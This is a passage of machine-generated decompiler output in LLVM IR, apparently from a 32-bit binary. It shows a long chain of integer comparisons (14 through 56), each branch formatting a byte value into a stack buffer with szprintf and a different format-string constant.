  br label %dec_label_pc_100033c4

dec_label_pc_100033c4:                            ; preds = %dec_label_pc_10003370, %dec_label_pc_1000337c
  %v3_100033c8 = icmp eq i32 %v2_10002f1c, 14
  br i1 %v3_100033c8, label %dec_label_pc_100033d0, label %dec_label_pc_10003418

dec_label_pc_100033d0:                            ; preds = %dec_label_pc_100033c4
  %v2_100033d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100033e4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100033e4 = zext i8 %v3_100033e4 to i32
  %v4_10003414 = call i32 @szprintf(i32 %v2_100033d0, i32 ptrtoint ([13 x i8]* @global_var_10016604.62 to i32), i32 %v4_100033e4)
  br label %dec_label_pc_10003418

dec_label_pc_10003418:                            ; preds = %dec_label_pc_100033c4, %dec_label_pc_100033d0
  %v3_1000341c = icmp eq i32 %v2_10002f1c, 15
  br i1 %v3_1000341c, label %dec_label_pc_10003424, label %dec_label_pc_1000346c

dec_label_pc_10003424:                            ; preds = %dec_label_pc_10003418
  %v2_10003424 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003438 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003438 = zext i8 %v3_10003438 to i32
  %v4_10003468 = call i32 @szprintf(i32 %v2_10003424, i32 ptrtoint ([13 x i8]* @global_var_10016614.63 to i32), i32 %v4_10003438)
  br label %dec_label_pc_1000346c

dec_label_pc_1000346c:                            ; preds = %dec_label_pc_10003418, %dec_label_pc_10003424
  %v3_10003470 = icmp eq i32 %v2_10002f1c, 16
  br i1 %v3_10003470, label %dec_label_pc_10003478, label %dec_label_pc_100034c0

dec_label_pc_10003478:                            ; preds = %dec_label_pc_1000346c
  %v2_10003478 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000348c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000348c = zext i8 %v3_1000348c to i32
  %v4_100034bc = call i32 @szprintf(i32 %v2_10003478, i32 ptrtoint ([13 x i8]* @global_var_10016624.64 to i32), i32 %v4_1000348c)
  br label %dec_label_pc_100034c0

dec_label_pc_100034c0:                            ; preds = %dec_label_pc_1000346c, %dec_label_pc_10003478
  %v3_100034c4 = icmp eq i32 %v2_10002f1c, 17
  br i1 %v3_100034c4, label %dec_label_pc_100034cc, label %dec_label_pc_10003514

dec_label_pc_100034cc:                            ; preds = %dec_label_pc_100034c0
  %v2_100034cc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100034e0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100034e0 = zext i8 %v3_100034e0 to i32
  %v4_10003510 = call i32 @szprintf(i32 %v2_100034cc, i32 ptrtoint ([13 x i8]* @global_var_10016634.65 to i32), i32 %v4_100034e0)
  br label %dec_label_pc_10003514

dec_label_pc_10003514:                            ; preds = %dec_label_pc_100034c0, %dec_label_pc_100034cc
  %v3_10003518 = icmp eq i32 %v2_10002f1c, 18
  br i1 %v3_10003518, label %dec_label_pc_10003520, label %dec_label_pc_10003568

dec_label_pc_10003520:                            ; preds = %dec_label_pc_10003514
  %v2_10003520 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003534 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003534 = zext i8 %v3_10003534 to i32
  %v4_10003564 = call i32 @szprintf(i32 %v2_10003520, i32 ptrtoint ([13 x i8]* @global_var_10016644.66 to i32), i32 %v4_10003534)
  br label %dec_label_pc_10003568

dec_label_pc_10003568:                            ; preds = %dec_label_pc_10003514, %dec_label_pc_10003520
  %v3_1000356c = icmp eq i32 %v2_10002f1c, 19
  br i1 %v3_1000356c, label %dec_label_pc_10003574, label %dec_label_pc_100035bc

dec_label_pc_10003574:                            ; preds = %dec_label_pc_10003568
  %v2_10003574 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003588 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003588 = zext i8 %v3_10003588 to i32
  %v4_100035b8 = call i32 @szprintf(i32 %v2_10003574, i32 ptrtoint ([11 x i8]* @global_var_10016654.67 to i32), i32 %v4_10003588)
  br label %dec_label_pc_100035bc

dec_label_pc_100035bc:                            ; preds = %dec_label_pc_10003568, %dec_label_pc_10003574
  %v3_100035c0 = icmp eq i32 %v2_10002f1c, 20
  br i1 %v3_100035c0, label %dec_label_pc_100035c8, label %dec_label_pc_10003610

dec_label_pc_100035c8:                            ; preds = %dec_label_pc_100035bc
  %v2_100035c8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100035dc = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100035dc = zext i8 %v3_100035dc to i32
  %v4_1000360c = call i32 @szprintf(i32 %v2_100035c8, i32 ptrtoint ([12 x i8]* @global_var_10016660.68 to i32), i32 %v4_100035dc)
  br label %dec_label_pc_10003610

dec_label_pc_10003610:                            ; preds = %dec_label_pc_100035bc, %dec_label_pc_100035c8
  %v3_10003614 = icmp eq i32 %v2_10002f1c, 21
  br i1 %v3_10003614, label %dec_label_pc_1000361c, label %dec_label_pc_10003664

dec_label_pc_1000361c:                            ; preds = %dec_label_pc_10003610
  %v2_1000361c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003630 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003630 = zext i8 %v3_10003630 to i32
  %v4_10003660 = call i32 @szprintf(i32 %v2_1000361c, i32 ptrtoint ([13 x i8]* @global_var_1001666c.69 to i32), i32 %v4_10003630)
  br label %dec_label_pc_10003664

dec_label_pc_10003664:                            ; preds = %dec_label_pc_10003610, %dec_label_pc_1000361c
  %v3_10003668 = icmp eq i32 %v2_10002f1c, 22
  br i1 %v3_10003668, label %dec_label_pc_10003670, label %dec_label_pc_100036b8

dec_label_pc_10003670:                            ; preds = %dec_label_pc_10003664
  %v2_10003670 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003684 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003684 = zext i8 %v3_10003684 to i32
  %v4_100036b4 = call i32 @szprintf(i32 %v2_10003670, i32 ptrtoint ([11 x i8]* @global_var_1001667c.70 to i32), i32 %v4_10003684)
  br label %dec_label_pc_100036b8

dec_label_pc_100036b8:                            ; preds = %dec_label_pc_10003664, %dec_label_pc_10003670
  %v3_100036bc = icmp eq i32 %v2_10002f1c, 23
  br i1 %v3_100036bc, label %dec_label_pc_100036c4, label %dec_label_pc_1000370c

dec_label_pc_100036c4:                            ; preds = %dec_label_pc_100036b8
  %v2_100036c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100036d8 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100036d8 = zext i8 %v3_100036d8 to i32
  %v4_10003708 = call i32 @szprintf(i32 %v2_100036c4, i32 ptrtoint ([11 x i8]* @global_var_10016688.71 to i32), i32 %v4_100036d8)
  br label %dec_label_pc_1000370c

dec_label_pc_1000370c:                            ; preds = %dec_label_pc_100036b8, %dec_label_pc_100036c4
  %v3_10003710 = icmp eq i32 %v2_10002f1c, 24
  br i1 %v3_10003710, label %dec_label_pc_10003718, label %dec_label_pc_10003760

dec_label_pc_10003718:                            ; preds = %dec_label_pc_1000370c
  %v2_10003718 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000372c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000372c = zext i8 %v3_1000372c to i32
  %v4_1000375c = call i32 @szprintf(i32 %v2_10003718, i32 ptrtoint ([12 x i8]* @global_var_10016694.72 to i32), i32 %v4_1000372c)
  br label %dec_label_pc_10003760

dec_label_pc_10003760:                            ; preds = %dec_label_pc_1000370c, %dec_label_pc_10003718
  %v3_10003764 = icmp eq i32 %v2_10002f1c, 25
  br i1 %v3_10003764, label %dec_label_pc_1000376c, label %dec_label_pc_100037b4

dec_label_pc_1000376c:                            ; preds = %dec_label_pc_10003760
  %v2_1000376c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003780 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003780 = zext i8 %v3_10003780 to i32
  %v4_100037b0 = call i32 @szprintf(i32 %v2_1000376c, i32 ptrtoint ([12 x i8]* @global_var_100166a0.73 to i32), i32 %v4_10003780)
  br label %dec_label_pc_100037b4

dec_label_pc_100037b4:                            ; preds = %dec_label_pc_10003760, %dec_label_pc_1000376c
  %v3_100037b8 = icmp eq i32 %v2_10002f1c, 26
  br i1 %v3_100037b8, label %dec_label_pc_100037c0, label %dec_label_pc_10003808

dec_label_pc_100037c0:                            ; preds = %dec_label_pc_100037b4
  %v2_100037c0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100037d4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100037d4 = zext i8 %v3_100037d4 to i32
  %v4_10003804 = call i32 @szprintf(i32 %v2_100037c0, i32 ptrtoint ([12 x i8]* @global_var_100166ac.74 to i32), i32 %v4_100037d4)
  br label %dec_label_pc_10003808

dec_label_pc_10003808:                            ; preds = %dec_label_pc_100037b4, %dec_label_pc_100037c0
  %v3_1000380c = icmp eq i32 %v2_10002f1c, 27
  br i1 %v3_1000380c, label %dec_label_pc_10003814, label %dec_label_pc_1000385c

dec_label_pc_10003814:                            ; preds = %dec_label_pc_10003808
  %v2_10003814 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003828 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003828 = zext i8 %v3_10003828 to i32
  %v4_10003858 = call i32 @szprintf(i32 %v2_10003814, i32 ptrtoint ([13 x i8]* @global_var_100166b8.75 to i32), i32 %v4_10003828)
  br label %dec_label_pc_1000385c

dec_label_pc_1000385c:                            ; preds = %dec_label_pc_10003808, %dec_label_pc_10003814
  %v3_10003860 = icmp eq i32 %v2_10002f1c, 28
  br i1 %v3_10003860, label %dec_label_pc_10003868, label %dec_label_pc_100038b0

dec_label_pc_10003868:                            ; preds = %dec_label_pc_1000385c
  %v2_10003868 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000387c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000387c = zext i8 %v3_1000387c to i32
  %v4_100038ac = call i32 @szprintf(i32 %v2_10003868, i32 ptrtoint ([13 x i8]* @global_var_100166c8.76 to i32), i32 %v4_1000387c)
  br label %dec_label_pc_100038b0

dec_label_pc_100038b0:                            ; preds = %dec_label_pc_1000385c, %dec_label_pc_10003868
  %v3_100038b4 = icmp eq i32 %v2_10002f1c, 29
  br i1 %v3_100038b4, label %dec_label_pc_100038bc, label %dec_label_pc_10003904

dec_label_pc_100038bc:                            ; preds = %dec_label_pc_100038b0
  %v2_100038bc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100038d0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100038d0 = zext i8 %v3_100038d0 to i32
  %v4_10003900 = call i32 @szprintf(i32 %v2_100038bc, i32 ptrtoint ([12 x i8]* @global_var_100166d8.77 to i32), i32 %v4_100038d0)
  br label %dec_label_pc_10003904

dec_label_pc_10003904:                            ; preds = %dec_label_pc_100038b0, %dec_label_pc_100038bc
  %v3_10003908 = icmp eq i32 %v2_10002f1c, 30
  br i1 %v3_10003908, label %dec_label_pc_10003910, label %dec_label_pc_10003958

dec_label_pc_10003910:                            ; preds = %dec_label_pc_10003904
  %v2_10003910 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003924 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003924 = zext i8 %v3_10003924 to i32
  %v4_10003954 = call i32 @szprintf(i32 %v2_10003910, i32 ptrtoint ([13 x i8]* @global_var_100166e4.78 to i32), i32 %v4_10003924)
  br label %dec_label_pc_10003958

dec_label_pc_10003958:                            ; preds = %dec_label_pc_10003904, %dec_label_pc_10003910
  %v3_1000395c = icmp eq i32 %v2_10002f1c, 31
  br i1 %v3_1000395c, label %dec_label_pc_10003964, label %dec_label_pc_100039ac

dec_label_pc_10003964:                            ; preds = %dec_label_pc_10003958
  %v2_10003964 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003978 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003978 = zext i8 %v3_10003978 to i32
  %v4_100039a8 = call i32 @szprintf(i32 %v2_10003964, i32 ptrtoint ([12 x i8]* @global_var_100166f4.79 to i32), i32 %v4_10003978)
  br label %dec_label_pc_100039ac

dec_label_pc_100039ac:                            ; preds = %dec_label_pc_10003958, %dec_label_pc_10003964
  %v3_100039b0 = icmp eq i32 %v2_10002f1c, 32
  br i1 %v3_100039b0, label %dec_label_pc_100039b8, label %dec_label_pc_10003a00

dec_label_pc_100039b8:                            ; preds = %dec_label_pc_100039ac
  %v2_100039b8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100039cc = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100039cc = zext i8 %v3_100039cc to i32
  %v4_100039fc = call i32 @szprintf(i32 %v2_100039b8, i32 ptrtoint ([11 x i8]* @global_var_10016700.80 to i32), i32 %v4_100039cc)
  br label %dec_label_pc_10003a00

dec_label_pc_10003a00:                            ; preds = %dec_label_pc_100039ac, %dec_label_pc_100039b8
  %v3_10003a04 = icmp eq i32 %v2_10002f1c, 33
  br i1 %v3_10003a04, label %dec_label_pc_10003a0c, label %dec_label_pc_10003a54

dec_label_pc_10003a0c:                            ; preds = %dec_label_pc_10003a00
  %v2_10003a0c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003a20 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003a20 = zext i8 %v3_10003a20 to i32
  %v4_10003a50 = call i32 @szprintf(i32 %v2_10003a0c, i32 ptrtoint ([12 x i8]* @global_var_1001670c.81 to i32), i32 %v4_10003a20)
  br label %dec_label_pc_10003a54

dec_label_pc_10003a54:                            ; preds = %dec_label_pc_10003a00, %dec_label_pc_10003a0c
  %v3_10003a58 = icmp eq i32 %v2_10002f1c, 34
  br i1 %v3_10003a58, label %dec_label_pc_10003a60, label %dec_label_pc_10003aa8

dec_label_pc_10003a60:                            ; preds = %dec_label_pc_10003a54
  %v2_10003a60 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003a74 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003a74 = zext i8 %v3_10003a74 to i32
  %v4_10003aa4 = call i32 @szprintf(i32 %v2_10003a60, i32 ptrtoint ([12 x i8]* @global_var_10016718.82 to i32), i32 %v4_10003a74)
  br label %dec_label_pc_10003aa8

dec_label_pc_10003aa8:                            ; preds = %dec_label_pc_10003a54, %dec_label_pc_10003a60
  %v3_10003aac = icmp eq i32 %v2_10002f1c, 35
  br i1 %v3_10003aac, label %dec_label_pc_10003ab4, label %dec_label_pc_10003afc

dec_label_pc_10003ab4:                            ; preds = %dec_label_pc_10003aa8
  %v2_10003ab4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ac8 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003ac8 = zext i8 %v3_10003ac8 to i32
  %v4_10003af8 = call i32 @szprintf(i32 %v2_10003ab4, i32 ptrtoint ([12 x i8]* @global_var_10016724.83 to i32), i32 %v4_10003ac8)
  br label %dec_label_pc_10003afc

dec_label_pc_10003afc:                            ; preds = %dec_label_pc_10003aa8, %dec_label_pc_10003ab4
  %v3_10003b00 = icmp eq i32 %v2_10002f1c, 36
  br i1 %v3_10003b00, label %dec_label_pc_10003b08, label %dec_label_pc_10003b50

dec_label_pc_10003b08:                            ; preds = %dec_label_pc_10003afc
  %v2_10003b08 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003b1c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003b1c = zext i8 %v3_10003b1c to i32
  %v4_10003b4c = call i32 @szprintf(i32 %v2_10003b08, i32 ptrtoint ([12 x i8]* @global_var_10016730.84 to i32), i32 %v4_10003b1c)
  br label %dec_label_pc_10003b50

dec_label_pc_10003b50:                            ; preds = %dec_label_pc_10003afc, %dec_label_pc_10003b08
  %v3_10003b54 = icmp eq i32 %v2_10002f1c, 37
  br i1 %v3_10003b54, label %dec_label_pc_10003b5c, label %dec_label_pc_10003ba4

dec_label_pc_10003b5c:                            ; preds = %dec_label_pc_10003b50
  %v2_10003b5c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003b70 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003b70 = zext i8 %v3_10003b70 to i32
  %v4_10003ba0 = call i32 @szprintf(i32 %v2_10003b5c, i32 ptrtoint ([12 x i8]* @global_var_1001673c.85 to i32), i32 %v4_10003b70)
  br label %dec_label_pc_10003ba4

dec_label_pc_10003ba4:                            ; preds = %dec_label_pc_10003b50, %dec_label_pc_10003b5c
  %v3_10003ba8 = icmp eq i32 %v2_10002f1c, 38
  br i1 %v3_10003ba8, label %dec_label_pc_10003bb0, label %dec_label_pc_10003bf8

dec_label_pc_10003bb0:                            ; preds = %dec_label_pc_10003ba4
  %v2_10003bb0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003bc4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003bc4 = zext i8 %v3_10003bc4 to i32
  %v4_10003bf4 = call i32 @szprintf(i32 %v2_10003bb0, i32 ptrtoint ([13 x i8]* @global_var_10016748.86 to i32), i32 %v4_10003bc4)
  br label %dec_label_pc_10003bf8

dec_label_pc_10003bf8:                            ; preds = %dec_label_pc_10003ba4, %dec_label_pc_10003bb0
  %v3_10003bfc = icmp eq i32 %v2_10002f1c, 39
  br i1 %v3_10003bfc, label %dec_label_pc_10003c04, label %dec_label_pc_10003c4c

dec_label_pc_10003c04:                            ; preds = %dec_label_pc_10003bf8
  %v2_10003c04 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003c18 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003c18 = zext i8 %v3_10003c18 to i32
  %v4_10003c48 = call i32 @szprintf(i32 %v2_10003c04, i32 ptrtoint ([13 x i8]* @global_var_10016758.87 to i32), i32 %v4_10003c18)
  br label %dec_label_pc_10003c4c

dec_label_pc_10003c4c:                            ; preds = %dec_label_pc_10003bf8, %dec_label_pc_10003c04
  %v3_10003c50 = icmp eq i32 %v2_10002f1c, 40
  br i1 %v3_10003c50, label %dec_label_pc_10003c58, label %dec_label_pc_10003ca0

dec_label_pc_10003c58:                            ; preds = %dec_label_pc_10003c4c
  %v2_10003c58 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003c6c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003c6c = zext i8 %v3_10003c6c to i32
  %v4_10003c9c = call i32 @szprintf(i32 %v2_10003c58, i32 ptrtoint ([13 x i8]* @global_var_10016748.86 to i32), i32 %v4_10003c6c)
  br label %dec_label_pc_10003ca0

dec_label_pc_10003ca0:                            ; preds = %dec_label_pc_10003c4c, %dec_label_pc_10003c58
  %v3_10003ca4 = icmp eq i32 %v2_10002f1c, 41
  br i1 %v3_10003ca4, label %dec_label_pc_10003cac, label %dec_label_pc_10003cf4

dec_label_pc_10003cac:                            ; preds = %dec_label_pc_10003ca0
  %v2_10003cac = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003cc0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003cc0 = zext i8 %v3_10003cc0 to i32
  %v4_10003cf0 = call i32 @szprintf(i32 %v2_10003cac, i32 ptrtoint ([13 x i8]* @global_var_10016768.88 to i32), i32 %v4_10003cc0)
  br label %dec_label_pc_10003cf4

dec_label_pc_10003cf4:                            ; preds = %dec_label_pc_10003ca0, %dec_label_pc_10003cac
  %v3_10003cf8 = icmp eq i32 %v2_10002f1c, 42
  br i1 %v3_10003cf8, label %dec_label_pc_10003d00, label %dec_label_pc_10003d48

dec_label_pc_10003d00:                            ; preds = %dec_label_pc_10003cf4
  %v2_10003d00 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003d14 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003d14 = zext i8 %v3_10003d14 to i32
  %v4_10003d44 = call i32 @szprintf(i32 %v2_10003d00, i32 ptrtoint ([13 x i8]* @global_var_10016778.89 to i32), i32 %v4_10003d14)
  br label %dec_label_pc_10003d48

dec_label_pc_10003d48:                            ; preds = %dec_label_pc_10003cf4, %dec_label_pc_10003d00
  %v3_10003d4c = icmp eq i32 %v2_10002f1c, 43
  br i1 %v3_10003d4c, label %dec_label_pc_10003d54, label %dec_label_pc_10003d9c

dec_label_pc_10003d54:                            ; preds = %dec_label_pc_10003d48
  %v2_10003d54 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003d68 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003d68 = zext i8 %v3_10003d68 to i32
  %v4_10003d98 = call i32 @szprintf(i32 %v2_10003d54, i32 ptrtoint ([13 x i8]* @global_var_10016788.90 to i32), i32 %v4_10003d68)
  br label %dec_label_pc_10003d9c

dec_label_pc_10003d9c:                            ; preds = %dec_label_pc_10003d48, %dec_label_pc_10003d54
  %v3_10003da0 = icmp eq i32 %v2_10002f1c, 44
  br i1 %v3_10003da0, label %dec_label_pc_10003da8, label %dec_label_pc_10003df0

dec_label_pc_10003da8:                            ; preds = %dec_label_pc_10003d9c
  %v2_10003da8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003dbc = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003dbc = zext i8 %v3_10003dbc to i32
  %v4_10003dec = call i32 @szprintf(i32 %v2_10003da8, i32 ptrtoint ([13 x i8]* @global_var_10016778.89 to i32), i32 %v4_10003dbc)
  br label %dec_label_pc_10003df0

dec_label_pc_10003df0:                            ; preds = %dec_label_pc_10003d9c, %dec_label_pc_10003da8
  %v3_10003df4 = icmp eq i32 %v2_10002f1c, 45
  br i1 %v3_10003df4, label %dec_label_pc_10003dfc, label %dec_label_pc_10003e44

dec_label_pc_10003dfc:                            ; preds = %dec_label_pc_10003df0
  %v2_10003dfc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003e10 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003e10 = zext i8 %v3_10003e10 to i32
  %v4_10003e40 = call i32 @szprintf(i32 %v2_10003dfc, i32 ptrtoint ([13 x i8]* @global_var_10016798.91 to i32), i32 %v4_10003e10)
  br label %dec_label_pc_10003e44

dec_label_pc_10003e44:                            ; preds = %dec_label_pc_10003df0, %dec_label_pc_10003dfc
  %v3_10003e48 = icmp eq i32 %v2_10002f1c, 46
  br i1 %v3_10003e48, label %dec_label_pc_10003e50, label %dec_label_pc_10003e98

dec_label_pc_10003e50:                            ; preds = %dec_label_pc_10003e44
  %v2_10003e50 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003e64 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003e64 = zext i8 %v3_10003e64 to i32
  %v4_10003e94 = call i32 @szprintf(i32 %v2_10003e50, i32 ptrtoint ([13 x i8]* @global_var_100167a8.92 to i32), i32 %v4_10003e64)
  br label %dec_label_pc_10003e98

dec_label_pc_10003e98:                            ; preds = %dec_label_pc_10003e44, %dec_label_pc_10003e50
  %v3_10003e9c = icmp eq i32 %v2_10002f1c, 47
  br i1 %v3_10003e9c, label %dec_label_pc_10003ea4, label %dec_label_pc_10003eec

dec_label_pc_10003ea4:                            ; preds = %dec_label_pc_10003e98
  %v2_10003ea4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003eb8 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003eb8 = zext i8 %v3_10003eb8 to i32
  %v4_10003ee8 = call i32 @szprintf(i32 %v2_10003ea4, i32 ptrtoint ([13 x i8]* @global_var_100167b8.93 to i32), i32 %v4_10003eb8)
  br label %dec_label_pc_10003eec

dec_label_pc_10003eec:                            ; preds = %dec_label_pc_10003e98, %dec_label_pc_10003ea4
  %v3_10003ef0 = icmp eq i32 %v2_10002f1c, 48
  br i1 %v3_10003ef0, label %dec_label_pc_10003ef8, label %dec_label_pc_10003f40

dec_label_pc_10003ef8:                            ; preds = %dec_label_pc_10003eec
  %v2_10003ef8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003f0c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003f0c = zext i8 %v3_10003f0c to i32
  %v4_10003f3c = call i32 @szprintf(i32 %v2_10003ef8, i32 ptrtoint ([13 x i8]* @global_var_100167c8.94 to i32), i32 %v4_10003f0c)
  br label %dec_label_pc_10003f40

dec_label_pc_10003f40:                            ; preds = %dec_label_pc_10003eec, %dec_label_pc_10003ef8
  %v3_10003f44 = icmp eq i32 %v2_10002f1c, 49
  br i1 %v3_10003f44, label %dec_label_pc_10003f4c, label %dec_label_pc_10003f94

dec_label_pc_10003f4c:                            ; preds = %dec_label_pc_10003f40
  %v2_10003f4c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003f60 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003f60 = zext i8 %v3_10003f60 to i32
  %v4_10003f90 = call i32 @szprintf(i32 %v2_10003f4c, i32 ptrtoint ([13 x i8]* @global_var_100167d8.95 to i32), i32 %v4_10003f60)
  br label %dec_label_pc_10003f94

dec_label_pc_10003f94:                            ; preds = %dec_label_pc_10003f40, %dec_label_pc_10003f4c
  %v3_10003f98 = icmp eq i32 %v2_10002f1c, 50
  br i1 %v3_10003f98, label %dec_label_pc_10003fa0, label %dec_label_pc_10003fe8

dec_label_pc_10003fa0:                            ; preds = %dec_label_pc_10003f94
  %v2_10003fa0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003fb4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003fb4 = zext i8 %v3_10003fb4 to i32
  %v4_10003fe4 = call i32 @szprintf(i32 %v2_10003fa0, i32 ptrtoint ([13 x i8]* @global_var_100167e8.96 to i32), i32 %v4_10003fb4)
  br label %dec_label_pc_10003fe8

dec_label_pc_10003fe8:                            ; preds = %dec_label_pc_10003f94, %dec_label_pc_10003fa0
  %v3_10003fec = icmp eq i32 %v2_10002f1c, 51
  br i1 %v3_10003fec, label %dec_label_pc_10003ff4, label %dec_label_pc_1000403c

dec_label_pc_10003ff4:                            ; preds = %dec_label_pc_10003fe8
  %v2_10003ff4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004008 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004008 = zext i8 %v3_10004008 to i32
  %v4_10004038 = call i32 @szprintf(i32 %v2_10003ff4, i32 ptrtoint ([14 x i8]* @global_var_100167f8.97 to i32), i32 %v4_10004008)
  br label %dec_label_pc_1000403c

dec_label_pc_1000403c:                            ; preds = %dec_label_pc_10003fe8, %dec_label_pc_10003ff4
  %v3_10004040 = icmp eq i32 %v2_10002f1c, 52
  br i1 %v3_10004040, label %dec_label_pc_10004048, label %dec_label_pc_10004090

dec_label_pc_10004048:                            ; preds = %dec_label_pc_1000403c
  %v2_10004048 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000405c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000405c = zext i8 %v3_1000405c to i32
  %v4_1000408c = call i32 @szprintf(i32 %v2_10004048, i32 ptrtoint ([13 x i8]* @global_var_10016808.98 to i32), i32 %v4_1000405c)
  br label %dec_label_pc_10004090

dec_label_pc_10004090:                            ; preds = %dec_label_pc_1000403c, %dec_label_pc_10004048
  %v3_10004094 = icmp eq i32 %v2_10002f1c, 53
  br i1 %v3_10004094, label %dec_label_pc_1000409c, label %dec_label_pc_100040e4

dec_label_pc_1000409c:                            ; preds = %dec_label_pc_10004090
  %v2_1000409c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100040b0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100040b0 = zext i8 %v3_100040b0 to i32
  %v4_100040e0 = call i32 @szprintf(i32 %v2_1000409c, i32 ptrtoint ([14 x i8]* @global_var_10016818.99 to i32), i32 %v4_100040b0)
  br label %dec_label_pc_100040e4

dec_label_pc_100040e4:                            ; preds = %dec_label_pc_10004090, %dec_label_pc_1000409c
  %v3_100040e8 = icmp eq i32 %v2_10002f1c, 54
  br i1 %v3_100040e8, label %dec_label_pc_100040f0, label %dec_label_pc_10004138

dec_label_pc_100040f0:                            ; preds = %dec_label_pc_100040e4
  %v2_100040f0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004104 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004104 = zext i8 %v3_10004104 to i32
  %v4_10004134 = call i32 @szprintf(i32 %v2_100040f0, i32 ptrtoint ([13 x i8]* @global_var_10016828.100 to i32), i32 %v4_10004104)
  br label %dec_label_pc_10004138

dec_label_pc_10004138:                            ; preds = %dec_label_pc_100040e4, %dec_label_pc_100040f0
  %v3_1000413c = icmp eq i32 %v2_10002f1c, 55
  br i1 %v3_1000413c, label %dec_label_pc_10004144, label %dec_label_pc_1000418c

dec_label_pc_10004144:                            ; preds = %dec_label_pc_10004138
  %v2_10004144 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004158 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10004158 = zext i8 %v3_10004158 to i32
  %v4_10004188 = call i32 @szprintf(i32 %v2_10004144, i32 ptrtoint ([14 x i8]* @global_var_10016838.101 to i32), i32 %v4_10004158)
  br label %dec_label_pc_1000418c

dec_label_pc_1000418c:                            ; preds = %dec_label_pc_10004138, %dec_label_pc_10004144
  %v3_10004190 = icmp eq i32 %v2_10002f1c, 56
  br i1 %v3_10004190, label %dec_label_pc_10004198, label %dec_label_pc_100041e0

dec_label_pc_10004198:                            ; preds = %dec_label_pc_1000418c
  %v2_10004198 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100041ac = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100041ac = zext i8 %v3_100041ac to i32
